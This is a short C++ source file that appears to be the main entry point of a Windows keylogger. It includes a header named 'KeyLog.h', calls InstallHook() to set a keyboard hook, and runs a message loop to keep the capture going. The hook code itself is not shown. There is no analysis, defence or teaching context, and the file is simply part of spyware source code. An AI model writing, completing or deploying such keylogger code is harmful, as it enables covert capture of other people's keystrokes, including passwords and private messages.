#include <iostream>
#include <windows.h>
#include "KeyLog.h"

using namespace std;

int main()
{
    MSG msg;
    InstallHook();

    while(GetMessage(&msg,NULL,0,0)) // loop to keep the program running
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
